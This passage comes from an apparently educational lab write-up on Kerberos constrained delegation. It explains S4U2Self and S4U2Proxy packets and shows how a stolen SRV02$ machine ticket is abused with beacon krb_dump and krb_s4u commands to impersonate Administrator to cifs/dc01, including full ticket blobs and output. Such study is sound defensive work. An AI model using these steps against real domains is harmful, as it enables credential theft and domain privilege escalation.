06c006f006c002e006c006f00630061006c004c004f004c002e004c004f00430041004c000000000000001000000032cc6b469ffda75339d8ad9210000000182a3170ee3da1e7d31b7364
```
`Field-0` is  The Ticket Flags, `Field-9` is The PAC. But what we are need is `field-1` where it is the session key. we will use it as key to decrypt the Authenticator, but first we need to change the Key Usage integer from 2 to 7, so it will be like this: `jnk = cipher.decrypt(key, 2, unhexlify(mycipher))`. 

Now after running the script again we get the decoded authenticator:
```shell
Sequence:
 field-0=5
 field-1=LOL.LOCAL
 field-2=Sequence:
  field-0=1
  field-1=SequenceOf:
   SRV02$

 field-3=Sequence:
  field-0=7
  field-1=0xc8bed10b3564b41c7bf807b5a59dc7b4

 field-4=132
 field-5=20260328152316Z
 field-6=1298893529
```

These steps wasn't necessary at all but it is good to understand what is happening under the hood.


#### PA-FOR-USER (S4U2Self extension)
![image](/assets/img/Delegation/4.png)
It exists because the user didn’t authenticate via Kerberos, so this is basically tells the KDC that it want to act on behalf of that user.

it has the target user (e.g., pixel) and Checksum. The Checksum is used to assure that no MitM can alter the request and change the target to user to an admin account. all the details of how it is calculated is here [^PA-FOR-USER]

> This is why we can impersonate any user with `/impersonateuser` option, because the DC trust the service that made the S4U2Self requset that a user has authenticated to it in someway (via NTLM or Smart Card). it was never designed to require proof of the user.
{: .prompt-info }

#### PA-FOR-X509-USER
PA-FOR-X509-USER is just the certificate-backed version of S4U. Instead of asking the KDC to impersonate a user by name, the service provides an X.509 certificate. From offensive perspective it can be used with ESC1/ESC6/ESC8 attacks IF we can get a certificate for a user to be combined with S4U

### s4u2self TGS-REP
![image](/assets/img/Delegation/5.png)
This is the respond of the previous request. the KDC hands back a service ticket for user `pixel` to the service (SRV02). Even though the requset was sent by SRV02 it got back TGS for `pixel`, This is where can really observe the impersonation happening.

The actual TGS is encrypted by the `SRV02$` account key.

### S4U2Proxy TGS-REQ
![image](/assets/img/Delegation/6.png)

Now the service is requesting a new TGS to `cifs` service on behalf of the user.

Notice that there is no NO PA-FOR-USER anymore, We already impersonated the user in S4U2Self step.. we can now prove it using by providing the TGS that we got from the previous step in the `kerberos.additional_tickets`.

### S4U2Proxy TGS-REP
![image](/assets/img/Delegation/7.png)
The KDC hands back a service ticket to the TARGET service (`cifs`) as the user `pixel`. 

This TGS is encrypted using the target service key (in this case it is `DC01` key).

## Abusing Protocol Transition

If we compromised the `SRV02` machine and extracted the TGT for the `SRV02$` machine account, we can use it to perofrm a S4U2Self request then S4U2Proxy, and we the have complete freedom in what username we put in the TGS-REQ because the DC will blindly trust the cryptographic signature of `SRV02$` (which we stole).


### Getting SRV02's TGT


```shell
beacon> krb_dump /luid:3e4 /service:krbtgt
[+] Kerbeus DUMP by RalfHacker
[+] host called home, sent: 16807 bytes
[+] received output:

Action: List Kerberos Tickets( LUID: 3e4)

[*] Target service  : krbtgt
[*] Target LUID     : 3e4

UserName                : SRV02$
Domain                  : LOL
LogonId                 : 0:0x3e4
Session                 : 0
UserSID                 : S-1-5-20
Authentication package  : Negotiate
LogonServer             : 
UserPrincipalName       : 

[*] Cached tickets: (4)

  [1]
	ClientName               :  srv02$ @ LOL.LOCAL
	ServiceRealm             :  krbtgt/LOL.LOCAL @ LOL.LOCAL
	StartTime (UTC)          :  28.03.2026 09:42:46
	EndTime (UTC)            :  28.03.2026 19:41:48
	RenewTill (UTC)          :  04.04.2026 09:41:48
	Flags                    :  forwardable forwarded renewable pre_authent enc_pa_rep 
	KeyType                  :  aes256_cts_hmac_sha1

	doIE1DCCBNCgAwIBBaEDAgEWooID5DCCA+BhggPcMIID2KADAgEFoQsbCUxPTC5MT0NBTKIeMBygAwIBAqEVMBMbBmtyYnRndBsJTE9MLkxPQ0FMo4IDojCCA56gAwIBEqEDAgECooIDkASCA4z5L2UXOO1EAqTexFsnZLzhEn7s3m6yWAphFz4AKYp9MGXbbUDys+e1GTz/HnshQJXkSfcXK+WWlOvsb8p3iGo9p2oCY0bLznYHbYnFgI4Rvj9+aT8rP33w0mngS/cyv6/Dx0/bjQV41IKObdJnNI/9xgmtnV/0S36EzkeeASkds7GUzlzImFlsdIPA4uRVAbC26jYp+irrcqI7NVqy9mD6ZFdwAAalYP2jaQR7seAgw2x/ml13y7U4Fj2fQeGyF0uX1YSNwzewoV0V/5FZcXquxHFmwtq1FfQAKcityaUDLAln4ITF69y4SjO8CKIE5tFLtVVmnT/qO30YDSEshrvZj9y2pMkB15fRBqzC9wyN9hOVd+zQ7tLkHnpgrKUHUw4An43ITzmXFcw1PUQykKY3p7LWjQCma8eMAL2KUoJH7r97gD3wJ045YGuToo6GPpa3ecRPKRlkwaUeDvlZsU7klBWv+Xw+uX9+WJ4OzFQPDInoLyQ/w9Luyfzzk5dqDqXXqp39JejsgSw6IRRUOoNn+6/NH1olpazYSyh/Sfwi5ZNf9SLIKX+2zrDQ1HySyL3hb6FmBkfoBkEMCi9ey5IrUTQtjNunR9K+/W+1OjVjNKx9Bpp4BeuSMNGLiVPvv+QLgpbs1jBbP1yMqcbV1lq0Ba2ZA/XsA/Qmn8gjiJuumS8d+kzbEXXb9R0wB1rOwQspm93Qm0r+ooUozQg7uAS+yJ5G4OoZ2+g1vJ5uaSo/PB2uHKyfARkVn/S54mKIkJmV38jS4VHTlJgeOItYE3r+1tIpduZLXHuNiPRlLFCiKSFAhbOLiE7ff7/Iqh4BgDSbZ9uw5fvOQct1XqFtvx/egGStLdeBMwJPz6qt+j/NJy5so/vq05Xo2kqwWudSk8uO8TTLKvuDiv3gcx109hmYb6ckdSnu8re19Z+p7oV4rFCF8oVR1ku9qpkJkzSBJLcDIidflVIhSGsDsnSrTrJmbDnojWJijmicjw/9ytr22gZuZ427FWuJsvYxSRJg8x3d2O+AGJvtdREot8BoK5b2NOVHSh1Ljg+VC2BKSWQD3pKjTK7dBoEt1tSYAnaZsxrYChVJDQIXZ7HmE2rSd6+aFHd2a77zigp6sThaTODb311lYHpMyemkEyjwfREYCMBgE7X5eLoVBjoOsWAFuKUOZyUTnm93WCdZUWa/e7x5shPcy6mj3V1ZRtFcU6OB2zCB2KADAgEAooHQBIHNfYHKMIHHoIHEMIHBMIG+oCswKaADAgESoSIEIFHYjRGP5xBr8//JF8phM2/J4MIZUHjfQPLjUjib/h6ToQsbCUxPTC5MT0NBTKITMBGgAwIBAaEKMAgbBlNSVjAyJKMHAwUAQOEAAKURGA8yMDI2MDMyODIwNDI0OFqmERgPMjAyNjAzMjkwNjQyNDhapxEYDzIwMjYwNDA0MjA0MjQ4WqgLGwlMT0wuTE9DQUypHjAcoAMCAQKhFTATGwZrcmJ0Z3QbCUxPTC5MT0NBTA==

```

We can see that it has `forwardable` flag enabled, which is a must in order to carry out this attack.

### Requesting S4U2Self, S4U2Proxy

```shell
beacon> krb_s4u /ticket:doIE1DCCBNCgAwIBBaEDAgEWooID5DCCA+BhggPcMIID2KADAgEFoQsbCUxPTC5MT0NBTKIeMBygAwIBAqEVMBMbBmtyYnRndBsJTE9MLkxPQ0FMo4IDojCCA56gAwIBEqEDAgECooIDkASCA4z5L2UXOO1EAqTexFsnZLzhEn7s3m6yWAphFz4AKYp9MGXbbUDys+e1GTz/HnshQJXkSfcXK+WWlOvsb8p3iGo9p2oCY0bLznYHbYnFgI4Rvj9+aT8rP33w0mngS/cyv6/Dx0/bjQV41IKObdJnNI/9xgmtnV/0S36EzkeeASkds7GUzlzImFlsdIPA4uRVAbC26jYp+irrcqI7NVqy9mD6ZFdwAAalYP2jaQR7seAgw2x/ml13y7U4Fj2fQeGyF0uX1YSNwzewoV0V/5FZcXquxHFmwtq1FfQAKcityaUDLAln4ITF69y4SjO8CKIE5tFLtVVmnT/qO30YDSEshrvZj9y2pMkB15fRBqzC9wyN9hOVd+zQ7tLkHnpgrKUHUw4An43ITzmXFcw1PUQykKY3p7LWjQCma8eMAL2KUoJH7r97gD3wJ045YGuToo6GPpa3ecRPKRlkwaUeDvlZsU7klBWv+Xw+uX9+WJ4OzFQPDInoLyQ/w9Luyfzzk5dqDqXXqp39JejsgSw6IRRUOoNn+6/NH1olpazYSyh/Sfwi5ZNf9SLIKX+2zrDQ1HySyL3hb6FmBkfoBkEMCi9ey5IrUTQtjNunR9K+/W+1OjVjNKx9Bpp4BeuSMNGLiVPvv+QLgpbs1jBbP1yMqcbV1lq0Ba2ZA/XsA/Qmn8gjiJuumS8d+kzbEXXb9R0wB1rOwQspm93Qm0r+ooUozQg7uAS+yJ5G4OoZ2+g1vJ5uaSo/PB2uHKyfARkVn/S54mKIkJmV38jS4VHTlJgeOItYE3r+1tIpduZLXHuNiPRlLFCiKSFAhbOLiE7ff7/Iqh4BgDSbZ9uw5fvOQct1XqFtvx/egGStLdeBMwJPz6qt+j/NJy5so/vq05Xo2kqwWudSk8uO8TTLKvuDiv3gcx109hmYb6ckdSnu8re19Z+p7oV4rFCF8oVR1ku9qpkJkzSBJLcDIidflVIhSGsDsnSrTrJmbDnojWJijmicjw/9ytr22gZuZ427FWuJsvYxSRJg8x3d2O+AGJvtdREot8BoK5b2NOVHSh1Ljg+VC2BKSWQD3pKjTK7dBoEt1tSYAnaZsxrYChVJDQIXZ7HmE2rSd6+aFHd2a77zigp6sThaTODb311lYHpMyemkEyjwfREYCMBgE7X5eLoVBjoOsWAFuKUOZyUTnm93WCdZUWa/e7x5shPcy6mj3V1ZRtFcU6OB2zCB2KADAgEAooHQBIHNfYHKMIHHoIHEMIHBMIG+oCswKaADAgESoSIEIFHYjRGP5xBr8//JF8phM2/J4MIZUHjfQPLjUjib/h6ToQsbCUxPTC5MT0NBTKITMBGgAwIBAaEKMAgbBlNSVjAyJKMHAwUAQOEAAKURGA8yMDI2MDMyODIwNDI0OFqmERgPMjAyNjAzMjkwNjQyNDhapxEYDzIwMjYwNDA0MjA0MjQ4WqgLGwlMT0wuTE9DQUypHjAcoAMCAQKhFTATGwZrcmJ0Z3QbCUxPTC5MT0NBTA== /service:cifs/dc01 /impersonateuser:Administrator
[+] Kerbeus S4U by RalfHacker
[+] host called home, sent: 69064 bytes
[+] received output:
[*] Action: S4U

[*] Building S4U2self request for: 'SRV02$@LOL.LOCAL'
[+] S4U2self success!
[*] Got a TGS for 'Administrator' to 'SRV02$@LOL.LOCAL'
[*] base64(ticket.kirbi):

doIFRDCCBUCgAwIBBaEDAgEWooIEWDCCBFRhggRQMIIETKADAgEFoQsbCUxPTC5MT0NBTKITMBGgAwIBAaEKMAgbBlNSVjAyJKOCBCEwggQdoAMCARKhAwIBBaKCBA8EggQLd3XB04adbabEYJyunHuX0HLK7FbqZt/nez1j9mlFUfIwnrr6yz2tiTOCWiXu37aS3dejGHfq3JgXiB/Cl9iQ5zo5HnVKtzcRwepWVY1jc3fLi2iyk/d+y9QreGWBP+S3QsBQTXNZjxGL1itFyYCsHriUL1MNxslRm05j9M/sTZKviiFlzt7ptM9FQBKUH+W1w2+m1WdoK6ys3B9SqCqKNP5NrkiCf+40w4DmrdA35ZkJ+a4ED5Y9C2zTy/qRHUqbZvhdkHeA0fpm09ZIdKJLSdHfpNzmIbNoyEY7hlBnfgYYaemG8GREIM2uZ6ScBDhsL2KkXyNy7RTRchUsKLC2Y9pVoSb8UpB7B57q0r76fYkdaqChfF/Goy2r/Eh4lnN0NDt9WPYF4eHyjDvUdCgA19/qoUJb3kPCs59+jRFimo2sONbVvueyU0Uopt7cyBm1sc+HYTF2lU71Dqos0NupjVolbn6hBYrM+Z5ajNKyXuHdcwBHkoPLLjwjBZ3YkXYiL7qURPkDTO++LD/WSbbHkuv5ZmeI7qzM3Oh5SS037kZ++lU93FsLGOd5px8ZJWaHg6ce0Bbv6m73omR5HkN2HjIoVS/HEY3sQXop/fPpl8fFePxRpFk4JRbZMsW/0anLj0n0EG/P+sPXpPU8jAxaq1Ch3NUbOAuTT3NF1ILiWvT2w03061/Y+jQApCX+xvR+8STid0U2H5Bn2Zz09y5AUHS7z9ibWNkDFqWlncRfMY87McoEa0qr1QWTuowW4Ybzp8Hh+PHf2iIZSdMbpprElECPX8SUzGCPC8ZYlprjZ8KrY8mfPFoA0z1Vf7pPUVZ+iyMBY9l0zSJsW5XbAGrTtU81cj0Sh8m8wcaVuwDEa6pv9ui+TDoWhB7GpbeK1g+EuIWogJJgF7WdFgLjqo0oFKRI2XFjIKx3c4LUE39WMwb/cKe54+qzIAS/r9jHc0bZQKZdjJ4r3uj90rTPCisYXif9+W3J1E6cRNhjHKIkmlck4gTFvc3PtF7PNuSPxtWly78l5OXS+zuu59TebCUhucLM8Nh1w32qGqgZCVI60HXAnniGbUQnCSEvHa6K+17iN9bwRmVjVHzPg8jDpohaY0L8mJ4qF7REVWPfO6Pr1YaSr2+Zd7A2fO9Hu+SFoemtAeq9HrpucAZM+Y4Wr+Du4bfnYBsF3TW3Dkji1BhVrKmbbQeC3E/NZmB/vcWyOqwndpw8R4t+XvhUFKXXaU1HTWLcIXPsUWkJu5OrBLSunEp/4b8fn1dvJxlUdQjCm9KFgmctPEVsDUknejPkyWLx47VuSZpYV6I9CQ7fsn2h9q64aQ9ROYNtpqWydPtPWc67W4iQwjCJjMf49bMnopnJzknJjcQq5DqwkeC0o4HXMIHUoAMCAQCigcwEgcl9gcYwgcOggcAwgb0wgbqgKzApoAMCARKhIgQge9sbIjaB4WXuExLC2Vaqu3MFJWF5CLsdkszFmyQQq/KhCxsJTE9MLkxPQ0FMohowGKADAgEKoREwDxsNQWRtaW5pc3RyYXRvcqMHAwUAQKEAAKURGA8yMDI2MDMyODIwNDQyOFqmERgPMjAyNjAzMjkwNjQyNDhapxEYDzIwMjYwMzI5MjA0NDM0WqgLGwlMT0wuTE9DQUypEzARoAMCAQGhCjAIGwZTUlYwMiQ=

[*] Impersonating user 'Administrator' to target SPN 'cifs/dc01'
[*] Building S4U2proxy request for service: 'cifs/dc01'
[+] S4U2proxy success!
[*] base64(ticket.kirbi) for SPN 'cifs/dc01':

doIFvDCCBbigAwIBBaEDAgEWooIE3DCCBNhhggTUMIIE0KADAgEFoQsbCUxPTC5MT0NBTKIXMBWgAwIBAqEOMAwbBGNpZnMbBGRjMDGjggShMIIEnaADAgESoQMCAQmiggSPBIIEiyD7sXBzid/44gLaARwkcEpkxAyU0/C1BeE2IKVcDGHDVqXY/KszzPJOAadyIO2Jr/cY5UraNdigaMQpsStAWtpIxhhBhgVSnK/oZ0INxfHDfYgjEAKtF04W5meqCHvIYzsvxvqEu4uvcgz+SEg9FWN9etAQlzVPgaGcKJxcX419nppm1XDVnoYE0+n1c0iLtUfT6sdQQiaGc948XSuSXZ//n4CsgnRqstkhaLxTvuBnpDH1IaKaNAnNQd+6+bYD6ViBqU5M6UMFn+83AgmVRlH9ogUH4Ambhy/Oe/6266WCx8H6c/WhcPy5QVwqxXvo0DmbZ2UsqyKKuHiU9rHfvzf0spvfOSSwg/iKoODZcUUEF4Ie2xB6joNzb9J7w/OI2hQCepN0ek2AhNxNWIQ3d14bDdxSTbL5LU7eh1zxv5+J54UrrEZR/7tv05Wjajl00zw5DOBtnPFDx/lFwveS+20OC1Hs0XpKFJ3D07xWnhlax/V0f+Gd8ONIu57iCXAjtOQQzDUTEqee8+SrQIeeKIQNwZ6oPT/XCyLoY5bhYNNl7F7jzaAUIkzh5xwJ4BZkCOO0taAhIG8IBVGJWW01/nbVL/dqsYDJPg/kT8vluYlrYdrrQ1efNgknvfgkd4luWFOzWfIEXP7jrufwpDchGWfHGEtdv3DB4GK77dzjv337hIyCzVUfZEUNjJA5+4GPF/cW4UXkjX7cdjgr1/qpVNgncWFx8PPx1iKp5UQ8bTEJsZUYJxWs0GVHnuO6QXYITRPfm7KsxYLHW+ryLQrJ3QG7cCSl+tvnjv7YOXV9cOQmUAuPu0dvkM9GDh3wbsaEaaYdFQKMhxy0vttvTSIAIvr8gCh42y2D47q+MfJqDmrFQZRqx96V3ePRUu0butfovkWXWuTF50gCnIY2hK1qgscMC3VJbhFZ8grQAn9SVJFAKj833kfIq+PooEeqLXZVbpJ52uKs2NZ9bLc2uU2eTFrJ8Rb2FMNaRE7y8zXNs4hnes92TtaxwPBdfqBtElcHfZbJgr9sZimZTiZ1CpmlRol1KtPIghDx+5Qg1w/5tCYHklBPQxuEeIpSYlXRtxCMpOSYxMpq6DmQI7MCwBQ3R7y/hTCd67M4ToBriaK6CF6Vsq77JqiGC8Yc5UBVcdeiYrler1wwO2loxoA5EZVRsQg+JIfvt6kwSJVm0aw7fO2aSvDivRK+BeOahCRKylss5X/eAeNeEYbm3zGmvQLlf9GcZkGy2bjm9RAr5TgJvRgyNVdW/v6g+XOb4bBaNRQ3FNWe2Ay2o4jpxo8uViMvfdrs9ooOfAcMVq0tu0x8sL9QpRpm7SUBLj9FqmVYmnESya0ihH/w1K9rEl5ps3+IZo1tGJJgxPIxkJ3GQVvr9hfzB/gKnwxVlwRNVa+o+RseAes/9RfadQOtHBVG+farLPJBhtBp01wDWbNxRuadpsA0WHHV/Kqu6Q5AaHvLg0zwXLLAu3+3TyvnpqOpxmX0HWy4pRbkJ9cLYGlnKae+o265E5aNFGEXL78B55bEs9eQDaaNwG3+LsxwVx72o4HLMIHIoAMCAQCigcAEgb19gbowgbeggbQwgbEwga6gGzAZoAMCARGhEgQQWzqd+1TIrytlekaV5BYQEqELGwlMT0wuTE9DQUyiGjAYoAMCAQqhETAPGw1BZG1pbmlzdHJhdG9yowcDBQBApQAApREYDzIwMjYwMzI4MjA0NDI4WqYRGA8yMDI2MDMyODIxNDQzNFqnERgPMjAyNjA0MDQyMDQyNDhaqAsbCUxPTC5MT0NBTKkXMBWgAwIBAqEOMAwbBGNpZnMbBGRjMDE=
```
and then use the TGS.


---

## S4U2Proxy (Kerberos Only)

![image](/assets/img/Delegation/8.png)


Instead of full S4U chain (S4U2Self → S4U2Proxy), the service will skip the S4U2Self and will only do S4U2Proxy cause it has a valid proof of the user’s identity already, I will explain it in more details but let's first take a look to the traffic
![image](/assets/img/Delegation/9.png)
_Traffic Capture Of Kerberos Only Configuration_


You remember our lab setup right?

| Machine | IP          | Configuration                                                        |
| :------ | :---------- | :---------------------------------------------------------------     |
| DC01    | 10.0.0.2    | Main DC (`lol.local`),  hosts the file share (`\\DC01\ShareSupport`) |
| SRV02   | 10.0.0.3    | Hosts IIS and is Allowed to Delegate to `DC01` (Constrained)         |
| WS01    | 10.0.0.4    | The machine that makes the HTTP request                              |

Let's break what is happening:

1. **AS-REQ/REP:** The client (on WS01) requests TGT for and gets it back (Normal kerberos auth).

2. **TGS-REQ/REP:** Client asks the KDC for a ST for `HTTP\srv02` then KDC issues one and give it back to the client. **Note that this ST is what gets presented to `SRV02` which then uses it as proof of the user's identity in the additional-tickets field of the S4U2Proxy request, skipping S4U2Self entirely.**

3. **AP-REQ:** Client presents ST *(the one from TGS-REP)* + Authenticator to IIS 

4. **TGS-REQ/REP:** `SRV02` Performs S4U2Proxy on behalf of the user asking KDC for ST for `cifs\DC01` then DC issues delegated CIFS ST. Inside of TGS-REQ it has two tickets (we will talk in  more details about them):
- `SRV02$`'s own TGT, which is encrypted by the machine own key to prove to the KDC that the request is legitimate
- pixel's ST for `HTTP/srv02` which is inside `additional-tickets` part as a proof that pixel authenticated to me.
5. Listing the `\\DC01\ShareSupport` content.

6. **AP-REP:** this is the respone of step 3 + HTTP Response.

Let's dive one level deep on one important packet, you guessed it... the S4U2Proxy packet!


### TGS-REQ - S4U2Proxy
![image](/assets/img/Delegation/10.png)


Notices that now we only have 2 PA-DATA and it is missing the `PA-FOR-USER` that we saw earlier in [S4U2Self TGS-REQ packet](https://0xpix3l.github.io/Active-Directory/Delegation/#s4u2self-tgs-req).

We have some interesting parts to look at:
![image](/assets/img/Delegation/11.png)

#### pA-TGS-REQ

This contains the TGT for the machine account itself to the KDC as a prove that they are the legitimate account
![image](/assets/img/Delegation/12.png)

In the req-body it is asking the KDC for ST for the `cifs\DC01`, And there is a special part called `additional-tickets` that has the `HTTP` TGS that we got back from the TGS-REP (packet 182)
![image](/assets/img/Delegation/13.png)


### The forwardable flag

The main reason that `s4u` attack worked when we had protocol transition enabled because the TGS was forwardable as we have seen above with `krb_description` command, but is it the same here?


```shell
beacon> krb_s4u /service:cifs/dc01 /impersonateuser:Administrator /ticket:doIE1DCCBNCgAwIBBaEDAgEWooID5DCCA+BhggPcMIID2KADAgEFoQsbCUxPTC5MT0NBTKIeMBygAwIBAqEVMBMbBmtyYnRndBsJTE9MLkxPQ0FMo4IDojCCA56gAwIBEqEDAgECooIDkASCA4xqoTl9ed6iyQsFWh0GxZnc1Kwd/3PQzeu1qJzfUPAvepWSgkJHJXKJT5EBn0jgBwSg2p5Zjd2No5oiTuxC13BDsHjPLcQ22xmUGAXU5AuoSN+22Wu9OISqsMR2NphyCbtf3S9WCHRrdHLtv+GCJ0JnyIgo8sZcZ8YN+kt1mSNbleSRvyUpQK93Trl/iyA3uRur2hVeOZWDgzRhypEJJlqUdDgXE7OrZDEs6mLvO4AJhiLR+8A2jCE//BsZvNYjlGcRgcjPpqKQzEMJMl9++jp5n29ethuKE1RNNR/wgCW7K7sZMSTYmBxN9RqcKjkiBNrpW812n4oaRoPb+T90RpCJKB9Wcqv/nr8zdRqH1yooZp8tpzURGUTmoD0TDOauOOkND0QXq75mhXTukJsjXtfhFPEe420p/ObVJxYeJp1NoaPEMP0tLJtTURf6b8aCHy7AN9QwehThLfCUFDuRg/0rtri572Kr+MHLki4Fkku2ynpI5Q5G/akCRtHqGlEmZXu4C1MlTaKwSbfpMgSQ7Iui9KJtBXANIe/R7wijfmsmy+mCyu6Ltlwzl87PkaSotEHNU7UmM3Duhi1Gtitk9ghrtmfNV4vneRvhTU9sNVLCDQZ3bCvC0tW462GhAP4SrKaWZ6a5zW9owhrRGue+9BV1TduWaE2PHOKXZQ2d5QZujm/Z2QIzpBB1cydrJTNNKQ33B8z4+OL1sU1/hvq+7xfFu2kQl8fjDtLo8OIHK42cZ1CmRpnATs8pWu8ZKF3GCRZd9ALx/Xx6H2xppTBH8It1u/+RrfHGeYHbAtOK3th4GbhgENKJngbrcPEvtHTcCsr0YJrsAS+UVjvSHpy40oiYNkVRQgr40p4VG+dNRcXxJVjqeQyd7fnVpxP+mm9Zc0/f8ES59dyVClQF+S7RXeD6ZsmUY/I9/wXx8Fs7BIxbTuuw6SWqEv2/19OKeOhXgmgfz3AHK5DtTgwBQMPJgAM5h5Ljl/Mw7WmfCw/7/J5/uT65ZIxC8VEqzo7Emj1VMnlzbi3/R3bU5xpsoUnncVPWCDru58nSWTwFhOo2ay+bPqsU/B+DhZDtoQNR+3nqIQt/cV/eEksY3F9hYyWErfGdYt+td+5nPgt7nz+Z/BYfI1OxGbA7ZUP1Rmfp2T7wjfs/Di0azoHncVccItXbQC3l08ClcU0Q4nVhQVTJoBbNbvSVwhGE4JvaCd9aVKOB2zCB2KADAgEAooHQBIHNfYHKMIHHoIHEMIHBMIG+oCswKaADAgESoSIEIE9iLIb2vV2RpzzP9soKd4WZlA1xPfGDSp9Gya3NALVfoQsbCUxPTC5MT0NBTKITMBGgAwIBAaEKMAgbBlNSVjAyJKMHAwUAQOEAAKURGA8yMDI2MDMyOTEwMDQ1N1qmERgPMjAyNjAzMjkyMDA0NTdapxEYDzIwMjYwNDA1MTAwNDU3WqgLGwlMT0wuTE9DQUypHjAcoAMCAQKhFTATGwZrcmJ0Z3QbCUxPTC5MT0NBTA==
[+] Kerbeus S4U by RalfHacker
[+] host called home, sent: 69064 bytes
[+] received output:
[*] Action: S4U

[*] Building S4U2self request for: 'SRV02$@LOL.LOCAL'
[+] S4U2self success!
[*] Got a TGS for 'Administrator' to 'SRV02$@LOL.LOCAL'
[*] base64(ticket.kirbi):

doIFRDCCBUCgAwIBBaEDAgEWooIEWDCCBFRhggRQMIIETKADAgEFoQsbCUxPTC5MT0NBTKITMBGgAwIBAaEKMAgbBlNSVjAyJKOCBCEwggQdoAMCARKhAwIBBaKCBA8EggQLQdmjdd3E1Dij26Ttv9OyqAKYP6C00cnZbqcQ+/wdDWNkb+8N+hbDSIGEiomqQhamkXd+8gFdN2XDDqRECpHpzlgEjqOgyo00Rsbfdu9BH3hRAon7pD2ha9o7EehmZLaxEt3aySkL/y7ULhLxpj3nvtX2rDdFn0g1gec0931hxiLB8lCwSelPnRQ702enyiI/RYbhYrCFWtknSCyU5jUK1ZXh66u7G0QfLYRu5IkdYKQ37JAdjRAotrELHnRTYHgfJkMw1jPLBGx4hLopXfUf21nyLyGufri9z0KiubLwkueb9vcUV07ANsvhjw513P9JNJFrgjGz7MYCLDpyiHPe+fZWaN0fwQvTiePoyakwEaeTHTBsJ4W5WIZ9k/HciIj361a42DFaxjCYrK5hda2NIoALKHBWg/TIncLJGpidXD3TtUa5lBLODM6KaUyUa1bRLRGds3UwsLxSD5M4LhBMCi86GSdeZdS2kxB0lAepPg9u5nMhXK6qHgMvWUt8ug8dyctbuHW544/mw6v3G7YXu0XOgh51w0u6fkTjfnJCKDi7iEEdlNvnQ3iDw2aNKW0ooeEWCbwoV+VIOgg31L5IsagsVjkk4VRSzK11L3nCjGiVwGwyXfRAQPhxygMoS1/82QGkAlmeP3oUVX9AhriUmwNA9cWf8FYRyBGtMfiBBG7SiwOfMV6n4Bu1sX676vhNNmdUUohf2rBPJV9fpidpZ9I5ho1NBwTR4D3iAPWp5H2KYUEtPkAGYSCLtza3ULblyRbn4E7aktTJrML09SCXRaJDHTE0UNIIBcUxpvcyVR8I7hbb4Db843o/oW81WHwKIGsnE36ysNrXmE4zOnVIP6a9JHFtIclTb5EQ1BSJDUS7Spoge1rdVf67BFVHp49ChOz6rupofeEPZsEw3gf71wCZzytA6iQHVf6mxGXFj8o1irrWvi1wBdrAMSXZwui3v1M7ny3ZIFXQkLAGsuiySTLUqhrsa7OzM2yabAGfbGv0cpawTiNhEePquNhFXWIgQvADfrKMOV0ha1iz5SOfeyWipNpzzu23JlIPo7GN+l2IjdGf8v2NBosjQZGlH4piTMRuL33Bdhvj+v5qOiPgnuMRDaQdLxQSy1iljfrcO1TANwJJlG3N7Hm7eudw6eRnsQrpjm+LlhizKwTo8lTJNQbLpYaMmrAz8Op1q/0Kz1VVUVb39lUrZIdReoN6BN+SQ5TMPL6H4tANcRzVulK7+LuS6AMbBpoaH9Me3biKo/2emKe8jh0r/dCwQ8L6hPNU2HgddrjpkE5uOmGhzE+pCIrQTyDOHLSMcLSEwowrqNlZCTsOSdNiWB+Dfo/eOdVaR2Hf9jCrnkj3SGFyU+oKxeW7RvVjmrTPRmV1o4HXMIHUoAMCAQCigcwEgcl9gcYwgcOggcAwgb0wgbqgKzApoAMCARKhIgQgA3/TI3ao+rtKQ+7bqwj+kAFj51D0yrpEH5E9CcPqQeOhCxsJTE9MLkxPQ0FMohowGKADAgEKoREwDxsNQWRtaW5pc3RyYXRvcqMHAwUAAKEAAKURGA8yMDI2MDMyOTE2NTc1MlqmERgPMjAyNjAzMjkyMDA0NTdapxEYDzIwMjYwMzMwMTY1NzUyWqgLGwlMT0wuTE9DQUypEzARoAMCAQGhCjAIGwZTUlYwMiQ=

[*] Impersonating user 'Administrator' to target SPN 'cifs/dc01'
[*] Building S4U2proxy request for service: 'cifs/dc01'

	[x] Kerberos error : 13
```


Actually no. Without protocol transition we cannot use `srv02` to get a forwardable service ticket with S4U2Self. if we use `krb_describe` to see the s4u2self that we got back it will not have forwardable flag.
```shell
beacon> krb_describe /ticket:doIFRDCCBUCgAwIBBaEDAgEWooIEWDCCBFRhggRQMIIETKADAgEFoQsbCUxPTC5MT0NBTKITMBGgAwIBAaEKMAgbBlNSVjAyJKOCBCEwggQdoAMCARKhAwIBBaKCBA8EggQLQdmjdd3E1Dij26Ttv9OyqAKYP6C00cnZbqcQ+/wdDWNkb+8N+hbDSIGEiomqQhamkXd+8gFdN2XDDqRECpHpzlgEjqOgyo00Rsbfdu9BH3hRAon7pD2ha9o7EehmZLaxEt3aySkL/y7ULhLxpj3nvtX2rDdFn0g1gec0931hxiLB8lCwSelPnRQ702enyiI/RYbhYrCFWtknSCyU5jUK1ZXh66u7G0QfLYRu5IkdYKQ37JAdjRAotrELHnRTYHgfJkMw1jPLBGx4hLopXfUf21nyLyGufri9z0KiubLwkueb9vcUV07ANsvhjw513P9JNJFrgjGz7MYCLDpyiHPe+fZWaN0fwQvTiePoyakwEaeTHTBsJ4W5WIZ9k/HciIj361a42DFaxjCYrK5hda2NIoALKHBWg/TIncLJGpidXD3TtUa5lBLODM6KaUyUa1bRLRGds3UwsLxSD5M4LhBMCi86GSdeZdS2kxB0lAepPg9u5nMhXK6qHgMvWUt8ug8dyctbuHW544/mw6v3G7YXu0XOgh51w0u6fkTjfnJCKDi7iEEdlNvnQ3iDw2aNKW0ooeEWCbwoV+VIOgg31L5IsagsVjkk4VRSzK11L3nCjGiVwGwyXfRAQPhxygMoS1/82QGkAlmeP3oUVX9AhriUmwNA9cWf8FYRyBGtMfiBBG7SiwOfMV6n4Bu1sX676vhNNmdUUohf2rBPJV9fpidpZ9I5ho1NBwTR4D3iAPWp5H2KYUEtPkAGYSCLtza3ULblyRbn4E7aktTJrML09SCXRaJDHTE0UNIIBcUxpvcyVR8I7hbb4Db843o/oW81WHwKIGsnE36ysNrXmE4zOnVIP6a9JHFtIclTb5EQ1BSJDUS7Spoge1rdVf67BFVHp49ChOz6rupofeEPZsEw3gf71wCZzytA6iQHVf6mxGXFj8o1irrWvi1wBdrAMSXZwui3v1M7ny3ZIFXQkLAGsuiySTLUqhrsa7OzM2yabAGfbGv0cpawTiNhEePquNhFXWIgQvADfrKMOV0ha1iz5SOfeyWipNpzzu23JlIPo7GN+l2IjdGf8v2NBosjQZGlH4piTMRuL33Bdhvj+v5qOiPgnuMRDaQdLxQSy1iljfrcO1TANwJJlG3N7Hm7eudw6eRnsQrpjm+Llhiz